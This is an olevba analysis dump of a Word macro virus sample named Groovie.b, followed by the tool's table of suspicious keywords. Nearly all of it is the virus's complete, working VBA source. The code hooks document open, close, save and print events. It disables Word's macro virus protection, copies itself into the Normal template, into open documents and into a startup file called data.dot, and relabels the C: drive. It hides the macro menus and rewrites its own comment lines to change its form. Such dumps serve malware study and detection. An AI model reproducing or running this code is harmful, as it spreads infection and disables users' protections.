olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.b-c470152eaf3505bfac4abaf1e1da498fe014efba
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.b-c470152eaf3505bfac4abaf1e1da498fe014efba - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Groovie.b-c470152eaf3505bfac4abaf1e1da498fe014efba - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Public I02 As Boolean
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Public I03 As Boolean
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Public I04 As Boolean
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Public I05 As Boolean
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Public I06 As String
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Public I07 As Boolean
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Public I08 As Boolean
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Function I09()
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
On Error Resume Next
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    If MacroContainer = NormalTemplate Then
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        I01 = "normal"
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        GoTo checkout
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    End If
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
checkout:
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End Function
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Function I10()
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
On Error Resume Next
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        If ActiveDocument.VBProject.VBComponents(i).Name = "groovie" Then I04 = True
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    Next i
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        If NormalTemplate.VBProject.VBComponents(i).Name = "groovie" Then I03 = True
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    Next i
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End Function
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Function I11()
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
On Error Resume Next
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Call I09
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Call I10
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    If I01 = "document" Then Call I12
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    If I01 = "normal" Then Call I13
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    If I01 = "orbit" Then Call I14
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End Function
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Function I12()
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
On Error Resume Next
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    If I03 = False And I05 = False Then
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        With NormalTemplate.VBProject
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        With .VBComponents.Import("c:\groovie.sys")
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        End With
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        End With
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    End If
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    If I02 = False Then
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        If I08 = False Then Documents.Open FileName:=I06
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        Shell ("label c: groovie"), 0
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        Windows(1).Close
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    End If
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End Function
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Function I13()
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
On Error Resume Next
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Application.ScreenUpdating = False
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    Call I17
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    If I04 = False And I07 = True Then
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        With ActiveDocument.VBProject
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        With .VBComponents.Import("c:\groovie.sys")
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        End With
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        End With
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        With Dialogs(wdDialogFileSummaryInfo)
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
            .Comments = "ALT-F11 says it's groovie!"
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
            .Execute
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        End With
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    End If
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    If I02 = False And I07 = True Then
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        If I08 = False Then Documents.Open FileName:=I06
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    End If
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    If I02 = False And I07 = False Then
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        Documents.Add Template:="", NewTemplate:=False
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    End If
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Application.ScreenUpdating = True
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End Function
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Function I14()
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
On Error Resume Next
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Application.ScreenUpdating = False
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        If I03 = False And I05 = False Then
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
            With NormalTemplate.VBProject
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
            With .VBComponents.Import("c:\groovie.sys")
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
            End With
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
            End With
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
            NormalTemplate.Save
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        End If
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        If I04 = False Then
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
            With ActiveDocument.VBProject
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
            With .VBComponents.Import("c:\groovie.sys")
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
            End With
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
            End With
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
            With Dialogs(wdDialogFileSummaryInfo)
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
                .Comments = "ALT-F11 says it's groovie!"
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
                .Execute
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
            End With
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        End If
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Application.ScreenUpdating = True
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End Function
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Function I15()
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
On Error Resume Next
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    Options.VirusProtection = False
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    Options.SaveNormalPrompt = False
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    Options.ConfirmConversions = False
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    I06 = ActiveDocument.FullName
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    Call I11
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End Function
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Sub AutoOpen()
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
On Error Resume Next
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Call I15
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End Sub
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Sub AutoClose()
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
On Error Resume Next
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
I08 = True
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Call I15
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End Sub
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Sub AutoExit()
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
On Error Resume Next
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Call I15
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End Sub
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Sub FileSaveAs()
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
On Error Resume Next
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Call I16
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Call I15
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Dialogs(wdDialogFileSaveAs).Show
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End Sub
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Sub filesave()
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
On Error Resume Next
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Call I16
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Call I15
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End Sub
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Sub fileclose()
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
On Error Resume Next
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
I08 = True
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Call I15
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
ActiveDocument.Close
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End Sub
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Sub fileprint()
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
On Error Resume Next
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Call I15
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Dialogs(wdDialogFilePrint).Show
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End Sub
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Sub ViewVBCode()
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End Sub
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Sub ToolsMacro()
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End Sub
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Sub FileTemplates()
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End Sub
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Function I17()
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
On Error GoTo docek
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    If ActiveDocument.Name <> "" Then
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
        I07 = True
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    End If
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    GoTo over
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
docek:
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
    I07 = False
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
over:
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End Function
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Function I16()
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Randomize
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
rn = Int(Rnd * 999)
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
With Application.VBE.ActiveVBProject.VBComponents("Groovie").CodeModule
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
For x = 2 To 358 Step 2
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
.deletelines x
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & rn & Application.ActivePrinter
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
Next x
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End With
 ' E-N30.11.99 18:07:56567ELIMSHATI-NEHSL567Kyo5 on LPT3:
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

